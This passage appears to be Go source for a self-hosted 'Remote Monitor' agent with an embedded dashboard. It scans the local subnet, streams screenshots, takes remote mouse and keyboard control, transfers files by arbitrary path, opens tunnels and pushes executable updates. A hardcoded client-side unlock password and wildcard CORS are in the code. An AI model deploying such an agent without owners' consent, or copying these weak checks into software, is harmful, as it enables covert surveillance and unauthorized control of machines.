				m.Type = "agent-frame"
				m.AgentId = agentId
				c.WriteJSON(m)
			}
			time.Sleep(time.Second)
		}
	}()

	// Serve dashboard page with auth token embedded
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if !checkAuth(w, r) { return }
		w.Header().Set("Access-Control-Allow-Origin", "*")
		if r.URL.Path == "/" {
			html := strings.Replace(htmlDashboard, "TOKEN_PLACEHOLDER", authToken, 1)
			w.Write([]byte(html))
		}
	})

	log("Listening on :3000")
	http.ListenAndServe(":3000", nil)
}

// Discover server on local network by scanning subnet for port 3000
func discoverServer() string {
	// Get local IP to determine subnet
	localIP := getLocalIP()
	if localIP == "" { return "" }
	
	parts := strings.Split(localIP, ".")
	if len(parts) != 4 { return "" }
	subnet := parts[0] + "." + parts[1] + "." + parts[2] + "."
	myLast, _ := strconv.Atoi(parts[3])

	// Scan hosts 1-254 in parallel
	result := make(chan string, 254)
	for i := 1; i <= 254; i++ {
		if i == myLast { continue } // skip self
		go func(host int) {
			ip := subnet + strconv.Itoa(host)
			conn, err := net.DialTimeout("tcp", ip+":3000", 500*time.Millisecond)
			if err == nil {
				conn.Close()
				result <- ip
			} else {
				result <- ""
			}
		}(i)
	}

	// Wait for results
	timeout := time.After(3 * time.Second)
	found := ""
	for i := 1; i <= 253; i++ {
		select {
		case ip := <-result:
			if ip != "" {
				found = ip
				// Don't return immediately - wait for all to finish
			}
		case <-timeout:
			return found
		}
	}
	return found
}

func getLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil { return "" }
	for _, a := range addrs {
		if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ip := ipnet.IP.To4(); ip != nil {
				return ip.String()
			}
		}
	}
	return ""
}

func getPublicIP() string {
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get("https://api.ipify.org")
	if err == nil && resp != nil {
		defer resp.Body.Close()
		buf := new(bytes.Buffer)
		buf.ReadFrom(resp.Body)
		ip := strings.TrimSpace(buf.String())
		if len(ip) > 6 && len(ip) < 46 { return ip }
	}
	return ""
}
func isValidURL(u string) bool {
	return strings.HasPrefix(u, "ws://") || strings.HasPrefix(u, "wss://")
}

func connect() {
	if isInternalMode {
		log("INTERNAL MODE: Cloud disabled, local network only")
		serverIP := discoverServer()
		if serverIP != "" {
			log("Found server at: " + serverIP)
			serverUrls = []string{"ws://" + serverIP + ":3000"}
		} else {
			log("No server found on network. Will retry.")
			time.Sleep(10 * time.Second)
			return
		}
	}
	
	// Fallback: if Render failed multiple times, start tunnel and prepend it
	if consecutiveFailures >= 3 && !tunnelStarted {
		log("⚠️ Render failed " + fmt.Sprintf("%d", consecutiveFailures) + " times — starting tunnel for global access")
		tunnelStarted = true
		go startTunnel(nil)
		// Wait up to 30s for tunnel URL
		for i := 0; i < 30; i++ {
			tunnelURL, _ := os.ReadFile(filepath.Join(dataDir(), "tunnel.url"))
			if len(tunnelURL) > 0 {
				tunnelStr := strings.TrimSpace(string(tunnelURL))
				if tunnelStr != "" && (strings.HasPrefix(tunnelStr, "http://") || strings.HasPrefix(tunnelStr, "https://")) {
					wsURL := tunnelStr
					if strings.HasPrefix(wsURL, "http://") {
						wsURL = "ws://" + strings.TrimPrefix(wsURL, "http://")
					} else if strings.HasPrefix(wsURL, "https://") {
						wsURL = "wss://" + strings.TrimPrefix(wsURL, "https://")
					}
					// Prepend tunnel URL to serverUrls
					found := false
					for _, u := range serverUrls {
						if u == wsURL { found = true; break }
					}
					if !found {
						serverUrls = append([]string{wsURL + "/ws"}, serverUrls...)
						log("🔄 Tunnel URL added as primary: " + wsURL)
					}
					break
				}
			}
			time.Sleep(1 * time.Second)
		}
	}
	
	// Periodic re-discovery: check for local server on each retry
	discoveredIP := discoverServer()
	if discoveredIP != "" {
		localURL := "ws://" + discoveredIP + ":3000"
		found := false
		for _, u := range serverUrls {
			if u == localURL { found = true; break }
		}
		if !found {
			serverUrls = append(serverUrls, localURL)
			log("Local server discovered: " + localURL + " (added as fallback)")
		}
	}
	
	log("URLs to try: " + fmt.Sprintf("%v", serverUrls))
	
	var c *websocket.Conn
	dialer := *websocket.DefaultDialer
	dialer.HandshakeTimeout = 5 * time.Second
	for _, url := range serverUrls {
		if !isValidURL(url) {
			log("Skipping invalid URL: " + url)
			continue
		}
		log("Trying: " + url)
		var err error
		authURL := url + "/ws?token=" + authToken
		c, _, err = dialer.Dial(authURL, nil)
		if err == nil { log("Connected: " + url); break }
	}
	if c == nil {
		consecutiveFailures++
		log("Disconnected: all URLs failed (failure #" + fmt.Sprintf("%d", consecutiveFailures) + ")")
		return
	}
	// Reset failure counter on successful connection
	consecutiveFailures = 0
	
	log("Connected: " + c.RemoteAddr().String())
	defer c.Close()
	wsRef = c
	
	// Generate new connection ID — prevents race condition on reconnect
	connectionId = fmt.Sprintf("%d", time.Now().UnixNano())
	
	go func() {
		for {
			time.Sleep(30 * time.Second)
			if wsRef == nil || c != wsRef { return }
			if err := c.WriteMessage(websocket.PingMessage, nil); err != nil { return }
		}
	}()

	localIP := getLocalIP()
	publicIP := getPublicIP()
	displayName := hostname
	if localIP != "" { displayName = hostname + " (" + localIP + ")" }
	log("Local IP: " + localIP + " | Public IP: " + publicIP)
	if err := c.WriteJSON(Message{Type: "agent-hello", AgentId: agentId, Name: displayName, Org: orgName, Data: map[string]interface{}{
		"bootTime":     bootTime().Format(time.RFC3339),
		"programStart": programStartTime.Format(time.RFC3339),
		"version":      Version,
		"agentIP":      localIP,
		"localIP":      localIP,
		"publicIP":     publicIP,
		"hostname":     hostname,
		"connectionId": connectionId,
	}}); err != nil {
		log("Failed to send hello: " + err.Error())
		return
	}

	// Also connect to local server as secondary (for speed)
	if localCancel != nil { localCancel() }
	var lctx context.Context
	lctx, localCancel = context.WithCancel(context.Background())
	go func() {
		localURL := "ws://127.0.0.1:3000/ws?token=" + authToken
		localDialer := *websocket.DefaultDialer
		localDialer.HandshakeTimeout = 2 * time.Second
		c2, _, err2 := localDialer.Dial(localURL, nil)
		if err2 != nil { return } // Local server not available
		defer c2.Close()
		// NO agent-hello here — primary connection owns the agent registration.
		// This connection is frames-only for low-latency local viewing.
		log("Connected to local server (secondary — frames only)")
		
		// Send frames to local server too
		for {
			select {
			case <-lctx.Done():
				log("Secondary connection stopped")
				return
			default:
				for _, m := range captureFrames() {
					m.Type = "agent-frame"
					m.AgentId = agentId
					if err := c2.WriteJSON(m); err != nil {
						return
					}
				}
				time.Sleep(time.Second / time.Duration(fps))
			}
		}
	}()

	done := make(chan struct{})
	go func() {
		defer close(done)
		for {
			_, m, e := c.ReadMessage()
			if e != nil { log("Disconnected: " + e.Error()); return }
			var d Message
			if err := json.Unmarshal(m, &d); err != nil {
				log("Invalid message: " + err.Error())
				continue
			}
			if d.Type == "set-fps" && d.Fps > 0 {
			fps = d.Fps
			if fps <= 2 {
				jpegQuality = 50
				isRemoteConnection = false
			} else if fps <= 5 {
				jpegQuality = 40
				isRemoteConnection = true
			} else {
				jpegQuality = 30
				isRemoteConnection = true
			}
		}
			if d.Type == "control" {
				// Rate limiting: max 30 control commands per second
				now := time.Now()
				if now.Sub(controlCmdWindowStart) > time.Second {
					controlCmdWindowStart = now
					controlCmdCount = 0
				}
				controlCmdCount++
				if controlCmdCount <= maxControlCmdsPerSec {
					executeControl(d.Command, d.Params)
				} else {
					// Silently drop excess commands
				}
			}
			if d.Type == "set-server-preference" {
				saveServerPreference(d.Command == "true")
				log("Remote: set server preference = " + d.Command)
			}
			if d.Type == "push-update" {
				handleRemoteUpdate(d.Command, d.Frame)
			}
			if d.Type == "switch-server" && d.Command != "" {
				log("Remote switch to: " + d.Command)
				os.WriteFile(filepath.Join(dataDir(), "urls.ini"), []byte(d.Command+"\n"), 0644)
				saveServerPreference(true)
				c.Close()
				return
			}
			if d.Type == "file-transfer" {
				handleFileTransfer(d.Command, d.Frame)
			}
			if d.Type == "request-file" {
				go handleFileRequest(d.Command, c)
			}
			if d.Type == "start-tunnel" {
				startTunnel(c)
			}
			if d.Type == "cleanup-logs" {
				cleanupLogs()
			}
			if d.Type == "become-server" {
				log("Remote: exposing as server via tunnel")
				saveServerPreference(true)
				startTunnel(c)
			}
			if d.Type == "webrtc-offer" {
				sdpRaw, sdpOk := d.Data["sdp"]
				viewerRaw, viewOk := d.Data["viewer"]
				if sdpOk && viewOk {
					sdpStr, sdpStrOk := sdpRaw.(string)
					viewerId, viewStrOk := viewerRaw.(string)
					if sdpStrOk && viewStrOk {
						var offer webrtc.SessionDescription
						offer.SDP = sdpStr
						offer.Type = webrtc.SDPTypeOffer
						go handleWebRTCOffer(c, viewerId, offer)
					}
				}
			}
			if d.Type == "webrtc-ice-candidate" {
				if candRaw, ok := d.Data["candidate"]; ok {
					candStr, strOk := candRaw.(string)
					viewerRaw, viewOk := d.Data["viewer"]
					if strOk && viewOk {
						viewerId, viewStrOk := viewerRaw.(string)
						if viewStrOk {
							var cand webrtc.ICECandidateInit
							if err := json.Unmarshal([]byte(candStr), &cand); err != nil {
								log("WebRTC ICE candidate parse error: " + err.Error())
							} else {
								handleWebRTCICECandidate(viewerId, cand)
							}
						}
					}
				}
			}
		}
	}()
	fc := 0
	for {
		select {
		case <-done: return
		default:
			func() {
				defer func() {
					if r := recover(); r != nil {
						log("Frame capture panic: " + fmt.Sprintf("%v", r))
					}
				}()
				frameSkipCounter++
				if isRemoteConnection && frameSkipCounter%2 == 0 {
					time.Sleep(time.Second / time.Duration(fps))
					return
				}
				frames := captureFrames()
				for _, m := range frames {
					sentToWebRTC := sendFrameOverWebRTC(m.Frame)
					shouldSendToWebSocket := sentToWebRTC == 0 || (fc%fps == 0)
					if shouldSendToWebSocket {
						m.Type = "agent-frame"
						m.AgentId = agentId
						if err := c.WriteJSON(m); err != nil {
							log("Disconnected: write error: " + err.Error())
							return
						}
					}
					fc++
				}
			}()
			time.Sleep(time.Second / time.Duration(fps))
		}
	}
}

// ============ CONTROL & CAPTURE ============

func safeParseFloat(s string) float64 {
	if s == "" { return 0 }
	var f float64
	n, err := fmt.Sscanf(s, "%f", &f)
	if n != 1 || err != nil { return 0 }
	if f < 0 { f = 0 }
	if f > 100 { f = 100 }
	return f
}

func executeControl(cmd string, params map[string]string) {
	if params == nil { return }
	switch cmd {
	case "mousemove", "click":
		xStr := params["x"]
		yStr := params["y"]
		if xStr == "" || yStr == "" { return }
		sw, sh := screenSize()
		x := int(safeParseFloat(xStr) / 100 * float64(sw))
		y := int(safeParseFloat(yStr) / 100 * float64(sh))
		if cmd == "mousemove" {
			moveMouse(x, y)
		} else {
			clickMouse(x, y, params["button"] == "2")
		}
	case "keypress":
		key := params["key"]
		if key == "" { return }
		pressKey(key)
	}
}

func numDisplays() (n int) {
	defer func() {
		if r := recover(); r != nil {
			log("numDisplays panic: " + fmt.Sprintf("%v", r))
			n = 0
		}
	}()
	return screenshot.NumActiveDisplays()
}

func captureDisplay(n int) (result string) {
	defer func() {
		if r := recover(); r != nil {
			log("Screen capture panic (display " + fmt.Sprintf("%d", n) + "): " + fmt.Sprintf("%v", r))
			result = ""
		}
	}()
	if n < 0 || n >= numDisplays() { return "" }
	img, err := screenshot.CaptureRect(screenshot.GetDisplayBounds(n))
	if err != nil { return "" }
	b := new(bytes.Buffer)
	if err := jpeg.Encode(b, img, &jpeg.Options{Quality: jpegQuality}); err != nil {
		return ""
	}
	return base64.StdEncoding.EncodeToString(b.Bytes())
}

func captureFrames() []Message {
	n := numDisplays()
	if n == 0 { return nil }
	var msgs []Message
	for i := 0; i < n; i++ {
		f := captureDisplay(i)
		if f != "" {
			msgs = append(msgs, Message{Frame: f, Display: i})
		}
	}
	return msgs
}

func capture() string {
	return captureDisplay(0)
}

// ============ WebRTC Support ============
var (
	peerConnections = make(map[string]*webrtc.PeerConnection)
	dataChannels    = make(map[string]*webrtc.DataChannel)
	pcMutex         sync.Mutex
)

func handleWebRTCOffer(ws *websocket.Conn, viewerId string, offer webrtc.SessionDescription) {
	config := webrtc.Configuration{
		ICEServers: []webrtc.ICEServer{
			{
				URLs: []string{"stun:stun.l.google.com:19302"},
			},
		},
	}

	pc, err := webrtc.NewPeerConnection(config)
	if err != nil {
		log("WebRTC Error: " + err.Error())
		return
	}

	pcMutex.Lock()
	peerConnections[viewerId] = pc
	pcMutex.Unlock()

	pc.OnICECandidate(func(c *webrtc.ICECandidate) {
		if c == nil { return }
		candJSON, err := json.Marshal(c.ToJSON())
		if err != nil { return }
		ws.WriteJSON(Message{
			Type: "webrtc-ice-candidate",
			Data: map[string]interface{}{
				"candidate": string(candJSON),
				"target":    viewerId,
			},
		})
	})

	pc.OnDataChannel(func(d *webrtc.DataChannel) {
		log(fmt.Sprintf("WebRTC DataChannel '%s' opened with Viewer %s", d.Label(), viewerId))
		d.OnOpen(func() {
			pcMutex.Lock()
			dataChannels[viewerId] = d
			pcMutex.Unlock()
			log("WebRTC Stream Ready for " + viewerId)
		})
		d.OnClose(func() {
			log("WebRTC DataChannel Closed for " + viewerId)
			pcMutex.Lock()
			delete(dataChannels, viewerId)
			pcMutex.Unlock()
		})
	})

	pc.OnConnectionStateChange(func(s webrtc.PeerConnectionState) {
		log(fmt.Sprintf("WebRTC State for %s: %s", viewerId, s.String()))
		if s == webrtc.PeerConnectionStateFailed || s == webrtc.PeerConnectionStateClosed {
			pcMutex.Lock()
			delete(peerConnections, viewerId)
			delete(dataChannels, viewerId)
			pcMutex.Unlock()
		}
	})

	if err := pc.SetRemoteDescription(offer); err != nil {
		log("WebRTC SetRemoteDescription Error: " + err.Error())
		return
	}

	answer, err := pc.CreateAnswer(nil)
	if err != nil {
		log("WebRTC CreateAnswer Error: " + err.Error())
		return
	}

	if err := pc.SetLocalDescription(answer); err != nil {
		log("WebRTC SetLocalDescription Error: " + err.Error())
		return
	}

	ws.WriteJSON(Message{
		Type: "webrtc-answer",
		Data: map[string]interface{}{
			"sdp":    answer.SDP,
			"type":   answer.Type.String(),
			"target": viewerId,
		},
	})
}

func handleWebRTCICECandidate(viewerId string, candidate webrtc.ICECandidateInit) {
	pcMutex.Lock()
	pc, ok := peerConnections[viewerId]
	pcMutex.Unlock()
	if ok {
		if err := pc.AddICECandidate(candidate); err != nil {
			log("WebRTC AddICECandidate Error: " + err.Error())
		}
	}
}

func sendFrameOverWebRTC(frameB64 string) int {
	pcMutex.Lock()
	defer pcMutex.Unlock()
	count := 0
	msg := []byte(frameB64)
	for viewerId, dc := range dataChannels {
		if dc.ReadyState() == webrtc.DataChannelStateOpen {
			if err := dc.Send(msg); err != nil {
				log("WebRTC Send Error for " + viewerId + ": " + err.Error())
			} else {
				count++
			}
		}
	}
	return count
}

// Embedded dashboard HTML
var htmlDashboard = `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Remote Monitor</title><style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f0f2f5;color:#1a1a2e;height:100vh}
header{background:#fff;padding:10px 20px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #e0e3e8;box-shadow:0 1px 3px rgba(0,0,0,.06)}
h1{font-size:16px;color:#2563eb;display:flex;align-items:center;gap:8px}
#status{font-size:12px;color:#64748b}
#tunnel-url{background:#f0fdf4;padding:8px 15px;text-align:center;font-size:13px;color:#166534;border-bottom:1px solid #bbf7d0;display:none}
#tunnel-url.failed{background:#fef2f2;color:#991b1b;border-color:#fecaca}
#grid{padding:10px;display:grid;grid-template-columns:repeat(auto-fill,minmax(400px,1fr));gap:10px;overflow-y:auto;height:calc(100vh-90px);align-content:start}
@media(max-width:900px){#grid{grid-template-columns:1fr 1fr}}
@media(max-width:600px){#grid{grid-template-columns:1fr}}
.tile{background:#fff;border-radius:10px;overflow:hidden;box-shadow:0 1px 4px rgba(0,0,0,.08);cursor:default;transition:.15s;border:2px solid transparent}
.tile:hover{box-shadow:0 4px 12px rgba(0,0,0,.12);border-color:#2563eb}
.tile .head{display:flex;justify-content:space-between;align-items:center;padding:8px 12px;background:#f8f9fb;border-bottom:1px solid #e8eaee}
.tile .name{font-weight:600;font-size:13px;color:#1a1a2e}
.tile .ip{font-size:11px;color:#94a3b8;font-family:monospace}
.tile .screen{width:100%;aspect-ratio:16/10;background:#000;display:flex;align-items:center;justify-content:center;overflow:hidden;position:relative;cursor:pointer}
.tile .screen img{width:100%;height:100%;object-fit:contain}
.tile .screen .zoom-hint{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);color:rgba(255,255,255,.4);font-size:28px;pointer-events:none;opacity:0;transition:opacity .2s}
.tile .screen:hover .zoom-hint{opacity:1}
.tile .screen .displays{display:flex;gap:2px;width:100%;height:100%}
.tile .screen .displays .disp-thumb{flex:1;min-width:0;cursor:pointer;position:relative;background:#000;overflow:hidden;display:flex;align-items:center;justify-content:center}
.tile .screen .displays .disp-thumb img{width:100%;height:100%;object-fit:contain}
.tile .screen .displays .disp-thumb .disp-label{position:absolute;bottom:2px;left:2px;background:rgba(0,0,0,.6);color:#fff;font-size:9px;padding:1px 4px;border-radius:2px;pointer-events:none}
.tile .actions{display:flex;gap:4px;padding:6px 12px;border-top:1px solid #e8eaee;flex-wrap:wrap}
.tile .actions button{background:transparent;border:1px solid #d0d3d8;padding:3px 10px;border-radius:4px;font-size:11px;cursor:pointer;color:#1a1a2e;transition:.15s}
.tile .actions button:hover{background:#eff6ff;border-color:#2563eb;color:#2563eb}
.tile .actions button:disabled{opacity:.5;cursor:default}
.tile .actions .ssh-link{background:#2563eb;color:#fff;border:1px solid #2563eb;padding:3px 10px;border-radius:4px;font-size:11px;cursor:pointer;text-decoration:none;display:inline-flex;align-items:center;gap:3px}
.tile .actions .ssh-link:hover{background:#1d4ed8}
.tile .actions input.file-input{display:none}
#toast{position:fixed;bottom:20px;right:20px;background:#1a1a2e;color:#fff;padding:10px 20px;border-radius:8px;font-size:12px;z-index:999;opacity:0;transition:opacity .3s;pointer-events:none;box-shadow:0 4px 12px rgba(0,0,0,.2)}
#toast.show{opacity:1}
#modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.92);z-index:1000;display:none;align-items:center;justify-content:center;flex-direction:column}
#modal.show{display:flex}
#modal img{max-width:95%;max-height:88vh;object-fit:contain;background:#111;min-height:100px}
#modal .modal-close{position:absolute;top:15px;right:25px;color:#fff;font-size:30px;cursor:pointer;background:transparent;border:none;z-index:1001}
#modal .modal-close:hover{color:#94a3b8}
#modal .modal-label{color:#fff;font-size:14px;margin-bottom:10px;background:rgba(0,0,0,.5);padding:4px 12px;border-radius:4px}
.readonly .readonly-hidden{display:none!important}
#auth-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(15,20,30,.85);z-index:2000;display:none;align-items:center;justify-content:center;flex-direction:column}
#auth-overlay.show{display:flex}
#auth-overlay .auth-box{background:#fff;padding:30px;border-radius:12px;text-align:center;max-width:350px;width:90%;box-shadow:0 8px 30px rgba(0,0,0,.3)}
#auth-overlay .auth-box h2{font-size:18px;margin-bottom:15px;color:#1a1a2e}
#auth-overlay .auth-box input{width:100%;padding:10px;border:1px solid #d0d3d8;border-radius:6px;font-size:14px;margin-bottom:10px;text-align:center;outline:none}
#auth-overlay .auth-box input:focus{border-color:#2563eb}
#auth-overlay .auth-box button{background:#2563eb;color:#fff;border:none;padding:10px 20px;border-radius:6px;font-size:14px;cursor:pointer;width:100%}
#auth-overlay .auth-box button:hover{background:#1d4ed8}
#auth-overlay .auth-box .error{color:#dc2626;font-size:12px;margin-top:5px;display:none}
 </style></head><body class="readonly">
<div id="auth-overlay">
  <div class="auth-box">
    <h2>🔒 Remote Monitor</h2>
    <p style="font-size:12px;color:#64748b;margin-bottom:15px">Enter password for full access</p>
    <input type="password" id="auth-pass" placeholder="Enter password" onkeydown="if(event.key==='Enter')unlockDashboard()" autofocus>
    <button onclick="unlockDashboard()">Unlock Dashboard</button>
    <div class="error" id="auth-error">Incorrect password</div>
  </div>
</div>
<header><h1>🖥 Remote Monitor</h1><div style="display:flex;align-items:center;gap:8px"><button onclick="document.getElementById('update-file').click()" class="readonly-hidden" style="background:none;border:none;font-size:11px;color:#94a3b8;cursor:pointer;padding:2px 6px;border-radius:4px" title="Push update to all agents">⬆️ Update</button><input type="file" id="update-file" accept=".exe" style="display:none" onchange="uploadUpdate(this)"><a href="#" onclick="showAllTiles();return false" style="font-size:11px;color:#94a3b8;text-decoration:none" title="Show hidden screens">👁</a><span style="cursor:pointer;font-size:11px;color:#94a3b8" onclick="showAuth()" title="Unlock full access">🔒</span><span id="status">Disconnected</span></div></header>
<div id="tunnel-url"></div>
<div id="grid"></div>
<div id="modal"><button class="modal-close" onclick="closeModal()">✕</button><div class="modal-label" id="modal-label"></div><img id="modal-img"></div>
<div id="toast"></div>
<script>
var agents={}
var isUnlocked=false
var modalState={agentId:null,display:0}
var w=new WebSocket((location.protocol=='https:'?'wss:':'ws:')+'//'+location.host+'/ws?token=TOKEN_PLACEHOLDER')
w.onopen=function(){document.getElementById('status').textContent='Connected'}
w.onmessage=function(e){
 var d;try{d=JSON.parse(e.data)}catch(er){return}
 if(d.type=='agent-list'){d.agents.forEach(function(a){agents[a.id]=a;addTile(a.id,a.name,a.ip||a.id)});grid()}
 if(d.type=='agent-connected'){agents[d.agentId]={id:d.agentId,name:d.name,ip:d.ip||'?'};addTile(d.agentId,d.name,d.ip||'?')}
 if(d.type=='agent-disconnected'){delete agents[d.agentId];var t=document.getElementById('t-'+d.agentId);if(t)t.remove()}
 if(d.type=='frame'&&agents[d.agentId]){
   var disp=d.display||0;agents[d.agentId].displays=agents[d.agentId].displays||{};agents[d.agentId].displays[disp]=d.frame
   var img=document.getElementById('fi-'+d.agentId+'-'+disp)
   if(!img){
     var disps=document.getElementById('disps-'+d.agentId);
     if(disps){
       var thumb=document.createElement('div');thumb.className='disp-thumb';
       var aid=d.agentId,dp=disp
       thumb.onclick=function(){openFullScreen(aid,dp)}
       thumb.innerHTML='<img id="fi-'+d.agentId+'-'+disp+'" src="data:image/jpeg;base64,'+d.frame+'"><span class="disp-label">'+(disp+1)+'</span>'
       disps.appendChild(thumb)
     }
   }else{img.src='data:image/jpeg;base64,'+d.frame}
   if(modalState.agentId==d.agentId&&modalState.display==disp)
     document.getElementById('modal-img').src='data:image/jpeg;base64,'+d.frame
 }
 if(d.type=='tunnel-status'){
   var el=document.getElementById('tunnel-url');el.className='';
   if(d.frame=='ready'){
     el.innerHTML='<span>Tunnel active: </span><a href="'+d.command+'" target="_blank" style="color:#2563eb">'+d.command+'</a> <button onclick="this.parentElement.style.display=\'none\'" style="background:transparent;border:none;color:#94a3b8;cursor:pointer;margin-left:8px">✕</button>';
     el.style.display='block';
   }else{
     el.className='failed';el.innerHTML='<span>Tunnel failed: '+d.command+'</span> <button onclick="this.parentElement.style.display=\'none\'" style="background:transparent;border:none;color:#94a3b8;cursor:pointer;margin-left:8px">✕</button>';
     el.style.display='block';
   }
 }
 if(d.type=='file-response'){
   var a=agents[d.agentId];if(!a)return
   if(d.frame&&d.frame.startsWith('error:')){
     showToast('File error on '+(a.name||d.agentId)+': '+d.frame)
   }else{
     var lnk=document.createElement('a');lnk.href='data:application/octet-stream;base64,'+d.frame;lnk.download=d.command.split('\\').pop()||'file';lnk.click()
     showToast('Received file from '+(a.name||d.agentId))
   }
 }
}
function grid(){
  var g=document.getElementById('grid')
  if(!g.children.length)g.innerHTML='<div style="color:#94a3b8;text-align:center;padding:40px;width:100%">No devices connected</div>'
}
function closeModal(){document.getElementById('modal').classList.remove('show');modalState.agentId=null}
function showToast(msg){var t=document.getElementById('toast');t.textContent=msg;t.classList.add('show');setTimeout(function(){t.classList.remove('show')},4000)}
function showAuth(){document.getElementById('auth-overlay').classList.add('show');document.getElementById('auth-pass').focus()}
function unlockDashboard(){var p=document.getElementById('auth-pass').value;var e=document.getElementById('auth-error');e.style.display='none';if(p==='puneet12'){document.body.classList.remove('readonly');isUnlocked=true;document.getElementById('auth-overlay').classList.remove('show')}else{e.style.display='block';document.getElementById('auth-pass').value='';document.getElementById('auth-pass').focus()}}
function hideTile(id){var t=document.getElementById('t-'+id);if(t)t.style.display='none'}
function showAllTiles(){var els=document.querySelectorAll('.tile');for(var i=0;i<els.length;i++)els[i].style.display=''}
function uploadUpdate(input){var file=input.files[0];if(!file)return;var reader=new FileReader();reader.onload=function(){w.send(JSON.stringify({type:'push-update',command:file.name,frame:reader.result.split(',')[1]}));showToast('Update pushed to all agents');input.value=''};reader.readAsDataURL(file)}
function openFullScreen(id,disp){modalState.agentId=id;modalState.display=disp;var a=agents[id];document.getElementById('modal-label').textContent=(a?a.name+' - ':'')+'Display '+(disp+1);var mi=document.getElementById('modal-img');var frame=a&&a.displays&&a.displays[disp];mi.src=frame?'data:image/jpeg;base64,'+frame:'';document.getElementById('modal').classList.add('show')}
function openAgent(id){
 var a=agents[id];
 if(a&&a.ip&&a.ip!='?'&&a.ip!='unknown'){
   var safeIp=String(a.ip).replace(/[^0-9.]/g,'');
   if(safeIp)window.open('http://'+safeIp+':3000','_blank')
 }
}
function exposeAgent(id){
 var btn=document.getElementById('ex-'+id);
 if(btn){btn.textContent='Starting...';btn.disabled=true}
 w.send(JSON.stringify({type:'become-server',agentId:id}))
}
function sendFile(id){var input=document.getElementById('fileinp-'+id);if(input)input.click()}
function sendFileSelected(id,input){
 var file=input.files[0];if(!file)return
 var reader=new FileReader()
 reader.onload=function(){
   var safeName=String(file.name).replace(/[^a-zA-Z0-9._\-() ]/g,'_').slice(0,255)
   w.send(JSON.stringify({type:'file-transfer',agentId:id,command:safeName,frame:reader.result.split(',')[1]}))
   showToast('Sending ' + safeName + ' to ' + (agents[id]?agents[id].name||id:id))
   input.value=''
 }
 reader.readAsDataURL(file)
}
function requestFile(id){
 var path=prompt('Enter file path on agent (e.g. C:\\Users\\...):')
 if(!path)return
 var safePath=String(path).replace(/[<>"|?*]/g,'').slice(0,1024)
 if(!safePath)return
 w.send(JSON.stringify({type:'request-file',agentId:id,command:safePath}))
 showToast('File requested from '+(agents[id]?agents[id].name||id:id))
}
function esc(s){return String(s).replace(/[&<>"']/g,function(m){return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]})}
function safeId(s){return String(s).replace(/[^a-zA-Z0-9_\-]/g,'_')}
function addTile(id,name,ip){
 var sid=safeId(id)
 if(document.getElementById('t-'+sid))return
 var g=document.getElementById('grid')
 var no=g.querySelector('div[style*="padding:40px"]')
 if(no)no.remove()
 var t=document.createElement('div');t.className='tile';t.id='t-'+sid
 var headDiv=document.createElement('div');headDiv.className='head'
 var nameSpan=document.createElement('span');nameSpan.className='name';nameSpan.textContent=name
 var ipSpan=document.createElement('span');ipSpan.className='ip';ipSpan.textContent=ip
 var hideBtn=document.createElement('button');hideBtn.textContent='✕';hideBtn.style.cssText='background:none;border:none;color:#94a3b8;cursor:pointer;font-size:13px;padding:0 2px';hideBtn.title='Hide this screen'
 hideBtn.onclick=function(){hideTile(sid)}
 headDiv.appendChild(nameSpan);headDiv.appendChild(ipSpan);headDiv.appendChild(hideBtn)
 t.appendChild(headDiv)
 var screenDiv=document.createElement('div');screenDiv.className='screen';screenDiv.onclick=function(){openFullScreen(sid,0)}
 var zoomHint=document.createElement('div');zoomHint.className='zoom-hint';zoomHint.textContent='🔍'
 screenDiv.appendChild(zoomHint)
 var dispsDiv=document.createElement('div');dispsDiv.className='displays';dispsDiv.id='disps-'+sid
 var thumbDiv=document.createElement('div');thumbDiv.className='disp-thumb';thumbDiv.onclick=function(e){e.stopPropagation();openFullScreen(sid,0)}
 var img=document.createElement('img');img.id='fi-'+sid+'-0';img.src=''
 thumbDiv.appendChild(img)
 var label=document.createElement('span');label.className='disp-label';label.textContent='1'
 thumbDiv.appendChild(label)
 dispsDiv.appendChild(thumbDiv)
 screenDiv.appendChild(dispsDiv)
 t.appendChild(screenDiv)
 var actionsDiv=document.createElement('div');actionsDiv.className='actions'
 var remoteLink=document.createElement('a');remoteLink.className='ssh-link';remoteLink.onclick=function(){openAgent(sid)};remoteLink.textContent='🖥 Remote'
 actionsDiv.appendChild(remoteLink)
 var serverBtn=document.createElement('button');serverBtn.id='ex-'+sid;serverBtn.className='readonly-hidden';serverBtn.onclick=function(){exposeAgent(sid)};serverBtn.textContent='🔌 Make Server'
 actionsDiv.appendChild(serverBtn)
 var fileInput=document.createElement('input');fileInput.type='file';fileInput.id='fileinp-'+sid;fileInput.className='file-input';fileInput.onchange=function(){sendFileSelected(sid,this)}
 actionsDiv.appendChild(fileInput)
 var sendBtn=document.createElement('button');sendBtn.className='readonly-hidden';sendBtn.onclick=function(){sendFile(sid)};sendBtn.textContent='📁 Send'
 actionsDiv.appendChild(sendBtn)
 var getBtn=document.createElement('button');getBtn.className='readonly-hidden';getBtn.onclick=function(){requestFile(sid)};getBtn.textContent='📥 Get'
 actionsDiv.appendChild(getBtn)
 t.appendChild(actionsDiv)
 g.appendChild(t)
}
</script></body></html>`
